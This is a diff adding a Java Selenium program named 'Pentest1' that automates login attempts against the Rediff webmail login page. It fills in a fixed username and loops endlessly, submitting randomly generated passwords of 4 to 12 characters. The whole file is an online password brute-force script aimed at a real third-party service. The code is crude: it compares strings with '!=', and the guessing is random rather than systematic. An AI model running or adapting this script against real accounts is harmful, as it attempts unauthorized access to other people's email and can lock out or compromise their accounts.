@@ -1,0 +1,96 @@
+/*
+ * To change this license header, choose License Headers in Project Properties.
+ * To change this template file, choose Tools | Templates
+ * and open the template in the editor.
+ */
+package pentest1;
+
+import java.security.SecureRandom;
+import org.openqa.selenium.By;
+import org.openqa.selenium.Keys;
+import org.openqa.selenium.WebDriver;
+import org.openqa.selenium.chrome.ChromeDriver;
+
+/**
+ *
+ * @author Shreya
+ */
+public class Pentest1 {
+
+    /**
+     * @param args the command line arguments
+     * 
+     */
+    static final String AB = "abcdefghijklmnopqrstuvwxyz123467890ABCDEFGHIJKLMNOPQRSTUVWXYZ";
+static SecureRandom rnd = new SecureRandom();
+    private static WebDriver driver=null;
+    public static void main(String[] args) {
+        // TODO code application logic here
+        System.setProperty("webdriver.chrome.driver","E:\\Table 9 pieces\\store1\\chromedriver.exe");
+        driver = new ChromeDriver();
+        
+        driver.get("https://mail.rediff.com/cgi-bin/login.cgi");
+       /* String s=driver.getCurrentUrl();int t=0;*/
+        /*if(s=="https://mail.rediff.com/cgi-bin/login.cgi")
+        {
+            System.out.println("TRUE");
+        }*/
+       
+       
+        driver.findElement(By.id("login1")).sendKeys("sample_username");
+        driver.findElement(By.id("password")).sendKeys(new Pentest1().randomString(4));
+        driver.findElement(By.name("proceed")).click();
+        
+        while(driver.getCurrentUrl()!="https://f5mail.rediff.com/ajaxprism/container?angular=1&els=349d92e04c1fd552aa0a9f5d54051f75&user_size=1"){
+            
+        
+        /*driver.findElement(By.id("login_field")).sendKeys("");*/
+        driver.findElement(By.id("passwd")).clear();
+        driver.findElement(By.id("username")).clear();
+        driver.findElement(By.id("username")).sendKeys("sample_username");
+            /*driver.element.sendKeys(Keys.chord(Keys.CONTROL, "a"), "55");*/
+        
+        driver.findElement(By.id("passwd")).sendKeys(/*aa[m]*/new Pentest1().randomString(4));
+        driver.findElement(By.name("Login")).click();
+        driver.findElement(By.id("passwd")).clear();
+        driver.findElement(By.id("passwd")).sendKeys(/*aa[m]*/new Pentest1().randomString(5));
+        driver.findElement(By.name("Login")).click();
+        driver.findElement(By.id("passwd")).clear();
+        driver.findElement(By.id("passwd")).sendKeys(/*aa[m]*/new Pentest1().randomString(6));
+        driver.findElement(By.name("Login")).click();
+        driver.findElement(By.id("passwd")).clear();
+        driver.findElement(By.id("passwd")).sendKeys(/*aa[m]*/new Pentest1().randomString(7));
+        driver.findElement(By.name("Login")).click();
+        driver.findElement(By.id("passwd")).clear();
+        driver.findElement(By.id("passwd")).sendKeys(/*aa[m]*/new Pentest1().randomString(8));
+        driver.findElement(By.name("Login")).click();
+        driver.findElement(By.id("passwd")).clear();
+        driver.findElement(By.id("passwd")).sendKeys(/*aa[m]*/new Pentest1().randomString(9));
+        driver.findElement(By.name("Login")).click();
+        driver.findElement(By.id("passwd")).clear();
+         driver.findElement(By.id("passwd")).sendKeys(/*aa[m]*/new Pentest1().randomString(10));
+        driver.findElement(By.name("Login")).click();
+        driver.findElement(By.id("passwd")).clear();
+         driver.findElement(By.id("passwd")).sendKeys(/*aa[m]*/new Pentest1().randomString(11));
+        driver.findElement(By.name("Login")).click();
+        driver.findElement(By.id("passwd")).clear();
+         driver.findElement(By.id("passwd")).sendKeys(/*aa[m]*/new Pentest1().randomString(12));
+        driver.findElement(By.name("Login")).click();
+        driver.findElement(By.id("passwd")).clear();
+         
+        
+           
+        }
+   
+        
+        
+        
+    }
+       String randomString( int len ){
+   StringBuilder sb = new StringBuilder( len );
+   for( int i = 0; i < len; i++ ) 
+      sb.append( AB.charAt( rnd.nextInt(AB.length()) ) );
+   return sb.toString();
+}
+    
+}
